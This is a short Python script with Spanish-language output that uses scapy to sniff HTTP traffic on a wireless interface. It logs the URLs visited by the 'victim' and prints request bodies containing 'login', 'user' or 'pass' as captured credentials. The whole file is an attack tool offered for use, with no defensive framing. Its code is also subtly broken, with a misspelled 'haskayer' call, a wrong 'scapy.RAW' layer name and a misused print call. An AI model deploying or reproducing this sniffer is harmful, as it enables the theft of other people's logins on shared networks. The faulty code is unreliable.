#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http 
from termcolor import colored 
import signal
import sys

def def_handler(sig, frame):
    print(f'\n [!] Saliendo...\n', 'red')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):

    cred_keywords = ['login', 'user', 'pass']

    if packet.haslayer(http.HTTPRequest):

        url = 'http://' + packet[http.HTTPRequest].host.decode() + packet[http.HTTPRequest].Path.decode()

        print(colored(f'[+] Url visitada por la victima: {url}', 'blue'))

        if packet.haskayer(scapy.Raw):
            try:
                response = packet[scapy.RAW].load.decode()

                for keyword in cred_keywords:
                    if keyword in response:
                        print(colored(f'\n[+] Posibles credenciales: {response}\n', 'green'))
                        break
            except:
                pass
def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    sniff('wlan0')

if __name__ == '__main__':
    main()
                      